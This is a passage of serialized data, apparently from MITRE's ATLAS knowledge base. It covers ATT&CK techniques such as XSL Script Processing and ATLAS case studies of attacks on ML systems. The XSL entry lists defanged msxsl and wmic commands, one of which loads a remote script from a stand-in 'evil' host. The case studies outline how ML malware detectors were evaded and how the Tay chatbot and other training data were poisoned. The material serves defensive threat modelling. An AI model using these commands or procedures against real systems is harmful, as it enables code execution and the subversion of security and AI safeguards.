\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa394582.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fsans-dfir-2015.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fglobal\u002Fen\u002Fcurrent-threats\u002Fpdfs\u002Fwp-windows-management-instrumentation.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:HJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047"},{url:fE,description:"Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016.",source_name:"Wikipedia SMB"},{url:BM,description:BN,source_name:BO},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Faa394582.aspx",description:"Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",source_name:"MSDN WMI"},{source_name:sg,url:sh,description:si},{url:fp,description:fq,source_name:fr}],tactics:[p]},{id:HK,"object-type":a,name:"XSL Script Processing",description:"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fdotnet\u002Fstandard\u002Fdata\u002Fxml\u002Fxslt-stylesheet-scripting-using-msxsl-script'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1127'\u003ETrusted Developer Utilities Proxy Execution\u003C\u002Fa\u003E, the Microsoft common line transformation utility binary (msxsl.exe) \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Fdownload\u002Fdetails.aspx?id=21714'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fpentestlab.blog\u002F2017\u002F07\u002F06\u002Fapplocker-bypass-msxsl\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. \u003Csup\u003E\u003Ca href='https:\u002F\u002Freaqta.com\u002F2018\u002F03\u002Fspear-phishing-campaign-leveraging-msxsl\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML\u002FXSL files an arbitrary file extension.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCommand-line examples:\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpentestlab.blog\u002F2017\u002F07\u002F06\u002Fapplocker-bypass-msxsl\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n* \u003Ccode\u003Emsxsl.exe customers[.]xml script[.]xsl\u003C\u002Fcode\u003E\n* \u003Ccode\u003Emsxsl.exe script[.]xsl script[.]xsl\u003C\u002Fcode\u003E\n* \u003Ccode\u003Emsxsl.exe script[.]jpeg script[.]jpeg\u003C\u002Fcode\u003E\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047'\u003EWindows Management Instrumentation\u003C\u002Fa\u003E to invoke JScript or VBScript within an XSL file.\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FWmic\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This technique can also execute local\u002Fremote scripts and, similar to its \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F010'\u003ERegsvr32\u003C\u002Fa\u003E\u002F \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1047'\u003EWindows Management Instrumentation\u003C\u002Fa\u003E provided they utilize the \u002FFORMAT switch.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCommand-line examples:\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FWmic\u002F'\u003E[11]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n* Local File: \u003Ccode\u003Ewmic process list \u002FFORMAT:evil[.]xsl\u003C\u002Fcode\u003E\n* Remote File: \u003Ccode\u003Ewmic os get \u002FFORMAT:”https[:]\u002F\u002Fexample[.]com\u002Fevil[.]xsl”\u003C\u002Fcode\u003E",external_references:[{source_name:b,external_id:HK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1220"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fdotnet\u002Fstandard\u002Fdata\u002Fxml\u002Fxslt-stylesheet-scripting-using-msxsl-script",description:"Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using \u003Cmsxsl:script\u003E. Retrieved July 3, 2018.",source_name:"Microsoft XSLT Script Mar 2017"},{url:"https:\u002F\u002Fwww.microsoft.com\u002Fdownload\u002Fdetails.aspx?id=21714",description:"Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.",source_name:"Microsoft msxsl.exe"},{url:"https:\u002F\u002Fpentestlab.blog\u002F2017\u002F07\u002F06\u002Fapplocker-bypass-msxsl\u002F",description:"netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.",source_name:"Penetration Testing Lab MSXSL July 2017"},{url:"https:\u002F\u002Freaqta.com\u002F2018\u002F03\u002Fspear-phishing-campaign-leveraging-msxsl\u002F",description:"Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.",source_name:"Reaqta MSXSL Spearphishing MAR 2018"},{description:"Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019.",url:"https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75",source_name:"XSL Bypass Mar 2019"},{source_name:"LOLBAS Wmic",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FWmic\u002F",description:"LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019."},{url:"https:\u002F\u002Ftwitter.com\u002Fdez_\u002Fstatus\u002F986614411711442944",description:"Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.",source_name:"Twitter SquiblyTwo Detection APR 2018"}],tactics:[d]},yA,wS,Fa,ry,ks,iF,zy,iN,rD,rF,lR,GQ,rl,rH,rn,jN,jP,jR,qV,AN,Cb,Cd,ku,Gy,HD,yQ,AC,iX,m_,uq,hR,Db,DK,u_,yC,rJ,wi,wk,wm,tu,np,ik,Hk,zQ,GA,Fx,pz,zh,Fz,yS,DP,AE,wK,rL,FV,FX,FZ,pb,GC,Cr,DR,xC,hZ,xK,wC,lv,tX,GH,nR,GJ,Cw,yE,va,ve,jD,ub,qA,je,na,Dd,HF,Hm,xM,us,pC,zj,Df,x_,vM,Hz,vO,vQ,vS,vU,pL,pN,BG,nr,it,Ho,xr,Bi,qC,zS,ud,qf,jh,nc,xR,EG,vg,wM,vi,AP,hT,iw,ru,mK,tZ,qJ,rN,t$,sm,iP,vp,so,sv,sq,ss,sx,sz,sB,pE,zl,pk,Bk,AR,qE,wo,jG,tw,wE,FB,Ff,qh,GL,ty,uJ,uL,uN,uP,uf,uu,uw,rP,vW,wf,yU,EI,FD,DU,pm,Bm,Gb,w$,lW,oA,Fh,kz,nT,wG,rR,wU,yG,kE,yI,ny,nD,Gg,Cy,EK,tf,nt,iz,Hq,oH,qL,zU,k_,lb,Gu,jI,h$,G$,Hb,Hd,pH,zn,FI,xb,xd,DW,D$,Bo,yK,uR,rW,xY,xt,lZ,oQ,ld,uh,wq,uj,ul,om,rp,Eb,zD,zF,HH,zH,zJ,zL,ib,GS,GX,lx,xy,lz,nV,lE,xT,vr,vv,vC,kG,xA,Gr,kI,AT,mc,rY,kK,GN,yM,AV,AX,AZ,oC,A$,El,CN,mh,lf,Bz,AG,kM,HB,ya,kO,Ed,Ef,oJ,BI,qN,xf,xO,xh,uT,Eh,ou,tq,id,FK,BK,oV,DB,BP,iR,BB,Dh,jz,CA,r_,Du,yO,Eo,kQ,nX,jk,ne,Gi,rr,vH,vJ,hV,pd,kS,Fj,Dw,rw,mN,tA,yW,xj,zW,At,zZ,Av,Ax,Ad,oo,lm,yY,oE,ow,hX,qX,Ht,AI,nI,CC,AK,Bb,Bd,CP,Hv,kU,ws,if0,zp,jX,oy,DD,sa,mj,sc,EM,EO,Hx,uV,Bf,BR,Ej,jq,ng,ml,zq,jB,Dj,ts,wI,jK,jt,ni,GZ,DF,mn,nZ,th,se,BT,nN,kW,kY],studies:[{id:"AML.CS0000",name:"Evasion of Deep Learning detector for malware C&C traffic","object-type":I,summary:"Palo Alto Networks Security AI research team tested a deep learning model for malware command and control (C&C) traffic detection in HTTP traffic.\nBased on the publicly available paper by Le et al.  [1], we built a model that was trained on a similar dataset as our production model and had performance similar to it.\nThen we crafted adversarial samples and queried the model and adjusted the adversarial sample accordingly till the model was evaded.\n","incident-date":bh,procedure:[{tactic:l,technique:gL,description:"We identified a machine learning based approach to malicious URL detection as a representative approach and potential target from the paper \"URLNet: Learning a URL representation with deep learning for malicious URL detection\" [1], which was found on arXiv (a pre-print repository).\n"},{tactic:e,technique:aH,description:"We acquired a similar dataset to the target production model.\n"},{tactic:e,technique:bj,description:"We built a model that was trained on a similar dataset as the production model.\nWe trained the model on ~ 33 million benign and ~ 27 million malicious HTTP packet headers.\nEvaluation showed a true positive rate of ~ 99% and false positive rate of ~0.01%, on average.\nTesting the model with a HTTP packet header from known malware command and control traffic samples was detected as malicious with high confidence (\u003E 99%).\n"},{tactic:n,technique:dJ,description:"We crafted evasion samples by removing fields from packet header which are typically not used for C&C communication (e.g. cache-control, connection, etc.)\n"},{tactic:n,technique:dG,description:"We queried the model with our adversarial examples and adjusted them until the model was evaded.\n"},{tactic:j,technique:Q,description:"With the crafted samples we performed online evasion of the ML-based spyware detection model.\nThe crafted packets were identified as benign with \u003E80% confidence.\nThis evaluation demonstrates that adversaries are able to bypass advanced ML detection techniques, by crafting samples that are misclassified by an ML model.\n"}],"reported-by":[HL],references:["Le, Hung, et al. \"URLNet: Learning a URL representation with deep learning for malicious URL detection.\" arXiv preprint arXiv:1802.03162 (2018)."]},{id:"AML.CS0001",name:"Botnet Domain Generation Algorithm (DGA) Detection Evasion","object-type":I,summary:"The Palo Alto Networks Security AI research team was able to bypass a Convolutional Neural Network (CNN)-based botnet Domain Generation Algorithm (DGA) detection [1] by domain name mutations.\nIt is a generic domain mutation technique which can evade most ML-based DGA detection modules.\nThe generic mutation technique can also be used to test the effectiveness and robustness of all DGA detection methods developed by security companies in the industry before it is deployed to the production environment.\n","incident-date":bh,procedure:[{tactic:l,technique:N,description:"DGA detection is a widely used technique to detect botnets in academia and industry.\nThe searched for research papers related to DGA detection.\n"},{tactic:e,technique:af,description:"The researchers acquired a publicly available CNN-based DGA detection model [1] and tested against a well-known DGA generated domain name data sets, which includes ~50 million domain names from 64 botnet DGA families.\nThe CNN-based DGA detection model shows more than 70% detection accuracy on 16 (~25%) botnet DGA families.\n"},{tactic:e,technique:dz,description:"The researchers developed a generic mutation technique that requires a minimal number of iterations.\n"},{tactic:n,technique:dH,description:"The researchers used the mutation technique to generate evasive domain names.\n"},{tactic:n,technique:dG,description:"Experiment results show that, after only one string is inserted once to the DGA generated domain names, the detection rate of all 16 botnet DGA families can drop to less than 25% detection accuracy.\n"},{tactic:d,technique:Q,description:"The DGA generated domain names mutated with this technique successfully evade the target DGA Detection model, allowing an adversary to continue communication with their [Command and Control]() servers.\n"}],"reported-by":[HL],references:["[1] Yu, Bin, Jie Pan, Jiaming Hu, Anderson Nascimento, and Martine De Cock. \"Character level based detection of DGA domain names.\" In 2018 International Joint Conference on Neural Networks (IJCNN), pp. 1-8. IEEE, 2018. Source code is available from Github: https:\u002F\u002Fgithub.com\u002Fmatthoffman\u002Fdegas"]},{id:"AML.CS0002",name:"VirusTotal Poisoning","object-type":I,summary:"An increase in reports of a certain ransomware family that was out of the ordinary was noticed.\nIn investigating the case, it was observed that many samples of that particular ransomware family were submitted through a popular Virus-Sharing platform within a short amount of time.\nFurther investigation revealed that based on string similarity, the samples were all equivalent, and based on code similarity they were between 98 and 74 percent similar.\nInterestingly enough, the compile time was the same for all the samples.\nAfter more digging, the discovery was made that someone used 'metame' a metamorphic code manipulating tool to manipulate the original file towards mutant variants.\nThe variants wouldn't always be executable but still classified as the same ransomware family.\n","incident-date":bh,procedure:[{tactic:e,technique:dy,description:"The actor obtained \u003Ca href='https:\u002F\u002Fgithub.com\u002Fa0rtega\u002Fmetame'\u003Emetame\u003C\u002Fa\u003E, a simple metamorphic code engine for arbitrary executables.\n"},{tactic:n,technique:ag,description:"The actor used a malware sample from a prevalent ransomware family as a start to create 'mutant' variants.\n"},{tactic:q,technique:dC,description:"The actor uploaded \"mutant\" samples to the platform.\n"},{tactic:k,technique:dB,description:"Several vendors started to classify the files as the ransomware family even though most of them won't run.\nThe \"mutant\" samples poisoned the dataset the ML model(s) use to identify and classify this ransomware family.\n"}],"reported-by":["Christiaan Beek (@ChristiaanBeek) - McAfee Advanced Threat Research"]},{id:"AML.CS0003",name:"Bypassing Cylance's AI Malware Detection","object-type":I,summary:"Researchers at Skylight were able to create a universal bypass string that\nwhen appended to a malicious file evades detection by Cylance's AI Malware detector.\n","incident-date":"2019-09-07",procedure:[{tactic:l,technique:gr,description:"The researchers read publicly available information about Cylance's AI Malware detector.\n"},{tactic:w,technique:dD,description:"The researchers used Cylance's AI Malware detector and enabled verbose logging to understand the inner workings of the ML model, particularly around reputation scoring.\n"},{tactic:e,technique:dz,description:"The researchers used the reputation scoring information to reverse engineer which attributes provided what level of positive or negative reputation.\nAlong the way, they discovered a secondary model which was an override for the first model.\nPositive assessments from the second model overrode the decision of the core ML model.\n"},{tactic:n,technique:dJ,description:"Using this knowledge, the researchers fused attributes of known good files with malware to manually create adversarial malware.\n"},{tactic:j,technique:Q,description:"Due to the secondary model overriding the primary, the researchers were effectively able to bypass the ML model.\n"}],"reported-by":["Research and work by Adi Ashkenazy, Shahar Zini, and SkyLight Cyber team.Notified to us by Ken Luu (@devianz_)"],references:["https:\u002F\u002Fskylightcyber.com\u002F2019\u002F07\u002F18\u002Fcylance-i-kill-you\u002F"]},{id:"AML.CS0004",name:"Camera Hijack Attack on Facial Recognition System","object-type":I,summary:"This type of attack can break through the traditional live detection model\nand cause the misuse of face recognition.\n","incident-date":bh,procedure:[{tactic:e,technique:R,description:"The attackers bought customized low-end mobile phones.\n"},{tactic:e,technique:f$,description:"The attackers obtained customized android ROMs and a virtual camera application.\n"},{tactic:e,technique:dy,description:"The attackers obtained software that turns static photos into videos, adding realistic effects such as blinking eyes.\n"},{tactic:m,technique:bx,description:"The attackers collected user identity information and face photos.\n"},{tactic:e,technique:bA,description:"The attackers registered accounts with the victims' identity information.\n"},{tactic:w,technique:dD,description:"The attackers used the virtual camera app to present the generated video to the ML-based facial recongition product used for user verification.\n"},{tactic:j,technique:Q,description:"The attackers successfully evaded the face recognition system and impersonated the victim.\n"}],"reported-by":["Henry Xuef, Ant Group AISEC Team"],references:aG},{id:"AML.CS0005",name:"Attack on Machine Translation Service - Google Translate, Bing Translator, and Systran Translate","object-type":I,summary:"Machine translation services (such as Google Translate, Bing Translator, and Systran Translate) provide public-facing UIs and APIs.\nA research group at UC Berkeley utilized these public endpoints to create an replicated model with near-production, state-of-the-art translation quality.\nBeyond demonstrating that IP can be stolen from a black-box system, they used the replicated model to successfully transfer adversarial examples to the real production services.\nThese adversarial inputs successfully cause targeted word flips, vulgar outputs, and dropped sentences on Google Translate and Systran Translate websites.\n","incident-date":"2020-04-30",procedure:[{tactic:l,technique:N,description:"The researchers used published research papers to identify the datasets and model architectures used by the target translaation services.\n"},{tactic:e,technique:aH,description:"The researchers gathered similar datasets that the target translation services used.\n"},{tactic:e,technique:dx,description:"The researchers gathered similar model architectures that the target translation services used.\n"},{tactic:w,technique:aI,description:"They abuse a public facing application to query the model and produce machine translated sentence pairs as training data.\n"},{tactic:n,technique:hw,description:"Using these translated sentence pairs, the researchers trained a model that replicates the behavior of the target model.\n"},{tactic:j,technique:hQ,description:"By replicating the model with high fidelity, the researchers demonstrated that an adversary could steal a model and violate the victim's intellectual property rights.\n"},{tactic:n,technique:dI,description:"The replicated models were used to generate adversarial examples that successfully transferred to the black-box translation services.\n"},{tactic:j,technique:Q,description:"The adversarial examples were used to evade the machine translation services.\n"}],"reported-by":["Work by Eric Wallace, Mitchell Stern, Dawn Song and reported by Kenny Song (@helloksong)"],references:["https:\u002F\u002Farxiv.org\u002Fabs\u002F2004.15015","https:\u002F\u002Fwww.ericswallace.com\u002Fimitation"]},{id:"AML.CS0006",name:"ClearviewAI Misconfiguration","object-type":I,summary:"Clearview AI's source code repository, though password protected, was misconfigured to allow an arbitrary user to register an account.\nThis allowed an external researcher to gain access to a private code repository that contained Clearview AI production credentials, keys to cloud storage buckets containing 70K video samples, and copies of its applications and Slack tokens.\nWith access to training data, a bad-actor has the ability to cause an arbitrary misclassification in the deployed model.\nThese kinds of attacks illustrate that any attempt to secure ML system should be on top of \"traditional\" good cybersecurity hygiene such as locking down the system with least privileges, multi-factor authentication and monitoring and auditing.\n","incident-date":"2020-04-16",procedure:[{tactic:q,technique:Y,description:"In this scenario, a security researcher gained initial access to via a valid account that was created through a misconfiguration.\n"}],"reported-by":["Mossab Hussein (@mossab_hussein)"],references:["https:\u002F\u002Ftechcrunch.com\u002F2020\u002F04\u002F16\u002Fclearview-source-code-lapse\u002Famp\u002F","https:\u002F\u002Fgizmodo.com\u002Fwe-found-clearview-ais-shady-face-recognition-app-1841961772"]},{id:"AML.CS0007",name:"GPT-2 Model Replication","object-type":I,summary:"OpenAI built GPT-2, a powerful natural language model and adopted a staged-release process to incrementally release 1.5 Billion parameter model. Before the 1.5B parameter model could be released by OpenAI eventually, two ML researchers replicated the model and released it to the public.\n","incident-date":"2019-08-22",procedure:[{tactic:l,technique:N,description:"Using the public documentation about GPT-2, ML researchers gathered information about the dataset, model architecture, and training hyper-parameters.\n"},{tactic:e,technique:dx,description:"The researchers obtained a reference implementation of a similar publicly available model called Grover.\n"},{tactic:e,technique:aH,description:"The researchers were able to manually recreate the dataset used in the original GPT-2 paper using the gathered documentation.\n"},{tactic:e,technique:gV,description:"The researchers were able to use TensorFlow Research Cloud via their academic credentials.\n"},{tactic:n,technique:bj,description:"The researchers modified Grover's objective function to reflect GPT-2's objective function and then trained on the dataset they curated.\nThey used Grover's initial hyperparameters for training.\nThis resulted in their replicated model.\n"}],"reported-by":["Vanya Cohen (@VanyaCohen)","Aaron Gokaslan (@SkyLi0n)","Ellie Pavlick","Stefanie Tellex"],references:["https:\u002F\u002Fwww.wired.com\u002Fstory\u002Fdangerous-ai-open-source\u002F","https:\u002F\u002Fblog.usejournal.com\u002Fopengpt-2-we-replicated-gpt-2-because-you-can-too-45e34e6d36dc"]},{id:"AML.CS0008",name:"ProofPoint Evasion","object-type":I,summary:"CVE-2019-20634 describes how ML researchers evaded ProofPoint's email protection system by first building a copy-cat email protection ML model, and using the insights to evade the live system.\n","incident-date":"2019-09-09",procedure:[{tactic:e,technique:af,description:"The researchers first gathered the scores from the Proofpoint's ML system used in email headers by sending a large number of emails through the system and scraping the model scores exposed in the logs.\n"},{tactic:e,technique:aH,description:"The researchers converted the collected scores into a dataset.\n"},{tactic:n,technique:bj,description:"Using these scores, the researchers replicated the ML mode by building a \"shadow\" aka copy-cat ML model.\n"},{tactic:n,technique:bY,description:"Next, the ML researchers algorithmically found samples that this \"offline\" copy cat model.\n"},{tactic:n,technique:dI,description:"Finally, these insights from the offline model allowed the researchers to create malicious emails that received preferable scores from the real ProofPoint email protection system, hence bypassing it.\n"}],"reported-by":["Will Pearce (@moo_hax)","Nick Landers (@monoxgas)"],references:["https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2019-20634","https:\u002F\u002Fgithub.com\u002Fmoohax\u002FTalks\u002Fblob\u002Fmaster\u002Fslides\u002FDerbyCon19.pdf","https:\u002F\u002Fgithub.com\u002Fmoohax\u002FProof-Pudding"]},{id:"AML.CS0009",name:"Tay Poisoning","object-type":I,summary:"Microsoft created Tay, a twitter chatbot for 18 to 24 year-olds in the U.S. for entertainment purposes. Within 24 hours of its deployment, Tay had to be decommissioned because it tweeted reprehensible words.\n","incident-date":"2016-03-23",procedure:[{tactic:w,technique:aI,description:"Adversaries were able to interact with Tay via a few different publicly available methods.\n"},{tactic:q,technique:dC,description:"Tay bot used the interactions with its twitter users as training data to improve its conversations.\nAdversaries were able to coordinate with the intent of defacing Tay bot by exploiting this feedback loop.\n"},{tactic:k,technique:dB,description:"By repeatedly interacting with Tay using racist and offensive language, they were able to bias Tay's dataset towards that language as well.\n"},{tactic:j,technique:hN,description:"As a result of this coordinated attack, Tay's conversation algorithms began to learn to generate reprehensible material.\nThis quickly lead to its decommissioning.\n"}],"reported-by":[HM],references:["https:\u002F\u002Fblogs.microsoft.com\u002Fblog\u002F2016\u002F03\u002F25\u002Flearning-tays-introduction\u002F","https:\u002F\u002Fspectrum.ieee.org\u002Ftech-talk\u002Fartificial-intelligence\u002Fmachine-learning\u002Fin-2016-microsofts-racist-chatbot-revealed-the-dangers-of-online-conversation"]},{id:"AML.CS0010",name:"Microsoft - Azure Service","object-type":I,summary:"The Azure Red Team and Azure Trustworthy ML team performed a red team exercise on an internal Azure service with the intention of disrupting its service. This operation had a combination of traditional ATT&CK enterprise techniques such as finding Valid account, and Executing code via an API -- all interleaved with adversarial ML specific steps such as offline and online evasion examples.","incident-date":bh,procedure:[{tactic:l,technique:N,description:gG},{tactic:q,technique:Y,description:"The team used a valid account to gain access to the network.\n"},{tactic:m,technique:hs,description:"The team found the model file of the target ML model and the necessary training data.\n"},{tactic:n,technique:bY,description:"Using the target model and data, the red team crafted evasive adversarial data.\n"},{tactic:w,technique:aI,description:"The team used an exposed API to access the target model.\n"},{tactic:j,technique:Q,description:"The team performed an online evasion attack by replaying the adversarial examples, which helped achieve this goal.\n"}],"reported-by":["Microsoft (Azure Trustworthy Machine Learning)"],references:aG},{id:"AML.CS0011",name:"Microsoft Edge AI - Evasion","object-type":I,summary:"The Azure Red Team performed a red team exercise on a new Microsoft product designed for running AI workloads at the Edge.\n","incident-date":"2020-02-01",procedure:[{tactic:l,technique:N,description:gG},{tactic:e,technique:af,description:"The team identified and obtained the publically available base model.\n"},{tactic:e,technique:af,description:"The team identified and obtained the publically dataset used by the model\n"},{tactic:w,technique:aI,description:"Then using the publicly available version of the ML model, started sending queries and analyzing the responses (inferences) from the ML model.\n"},{tactic:n,technique:dH,description:"The red team created an automated system that continuously manipulated an original target image, that tricked the ML model into producing incorrect inferences, but the perturbations in the image were unnoticeable to the human eye.\n"},{tactic:j,technique:Q,description:"Feeding this perturbed image, the red team was able to evade the ML model by causing misclassifications.\n"}],"reported-by":[HM],references:aG},{id:"AML.CS0012",name:"MITRE - Physical Adversarial Attack on Face Identification","object-type":I,summary:"MITRE's AI Red Team demonstrated a physical-domain evasion attack on a commercial face identification service with the intention of inducing a targeted misclassification.\nThis operation had a combination of traditional ATT&CK enterprise techniques such as finding Valid account, and Executing code via an API - all interleaved with adversarial ML specific attacks.\n","incident-date":bh,procedure:[{tactic:l,technique:N,description:gG},{tactic:q,technique:Y,description:"The team gained access via a valid account.\n"},{tactic:w,technique:aI,description:"The team accessed the inference API of the target model.\n"},{tactic:i,technique:hn,description:"The team identified the list of identities targeted by the model by querying the target model's inference API.\n"},{tactic:e,technique:aH,description:"The team acquired representative open source data.\n"},{tactic:e,technique:bj,description:"The team developed a proxy model using the open source data.\n"},{tactic:n,technique:bY,description:"Using the proxy model, the red team optimized a physical domain patch-based attack using expectation over transformation.\n"},{tactic:w,technique:hf,description:"The team placed the physical countermeasure in the physical environment.\n"},{tactic:j,technique:Q,description:"The team successfully evaded the model using the physical countermeasure and causing targeted misclassifications.\n"}],"reported-by":["MITRE AI Red Team"],references:aG}],matrix:{tactics:[gH,gO,gX,hb,hh,hj,hk,hl,hq,ht,hE,hJ]}},tacticStyling:{"Model Evasion":{icon:"mdi-eye-off",color:"deep-purple"},Reconnaissance:{icon:"mdi-account-search",color:"green lighten-2"},"Resource Development":{icon:"mdi-apps",color:"green"},"Initial Access":{icon:"mdi-door-open",color:"light-green darken-2"},Execution:{icon:"mdi-xml",color:"lime darken-2"},Persistence:{icon:"mdi-lock-open-plus",color:"amber"},"Privilege Escalation":{icon:"mdi-shield-account",color:HN},"Defense Evasion":{icon:"mdi-security",color:"orange lighten-2"},"Credential Access":{icon:"mdi-key",color:HN},Discovery:{icon:"mdi-cloud-search",color:"orange darken-2"},"Lateral Movement":{icon:"mdi-swap-horizontal-bold",color:"deep-orange lighten-2"},Collection:{icon:"mdi-file-multiple",color:"deep-orange"},"Command and Control":{icon:"mdi-lan-connect",color:"red"},Exfiltration:{icon:"mdi-package-down",color:"red darken-2"},Impact:{icon:"mdi-fire",color:"red darken-4"}}},serverRendered:true,routePath:"\u002Ftactics",config:{router_base:HO,name:{short:"ATLAS",long:"Adversarial Threat Landscape for Artificial-Intelligence Systems"},navigator_url:"https:\u002F\u002Fmitre.github.io\u002Fatlas-navigator\u002F",advml:{repo_url:"#",version:"2.0"},attack:{repo_url:"https:\u002F\u002Fgithub.com\u002Fmitre\u002Fcti\u002Ftree\u002Fmaster\u002Fenterprise-attack",version:"9"},analytics_id:"G-CE03P4X7S7",individual_case_study:{navigator_link:"https:\u002F\u002Fmitre.github.io\u002Fatlas-navigator\u002F#layerURL=https%3A%2F%2Fraw.githubusercontent.com%2Fmitre%2Fadvmlthreatmatrix%2Fgh-pages%2Fdata%2Fcase-study-layers%2F",raw_link:"https:\u002F\u002Fraw.githubusercontent.com\u002Fmitre\u002Fadvmlthreatmatrix\u002Fgh-pages\u002Fdata\u002Fcase-study-layers\u002F",suffix:"-case_study_layer.json"},_app:{basePath:HO,assetsPath:"\u002F_nuxt\u002F",cdnURL:aG},content:{dbHash:"6cd2f009"}}}}("technique","mitre-attack","capec","TA0005","TA0042","https:\u002F\u002Farxiv.org\u002Fftp\u002Farxiv\u002Fpapers\u002F1408\u002F1408.1136.pdf","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.","University of Birmingham C2","TA0007","TA0040","TA0003","TA0043","TA0009","AML.TA0001","TA0011","TA0002","TA0001","TA0006","T1546","tactic","TA0004","T1547","AML.TA0000","TA0008","https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fsysinternals\u002Fbb963902","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.","TechNet Autoruns","https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf","https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process","Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.","Elastic Process Injection July 2017","T1574","T1055","T1218","case-study","TA0010","Cisco Blog Legacy Device Attacks","https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954","Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.","AML.T0000","T1059","T1003","AML.T0015","T1583","Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.","Methods of Mac Malware 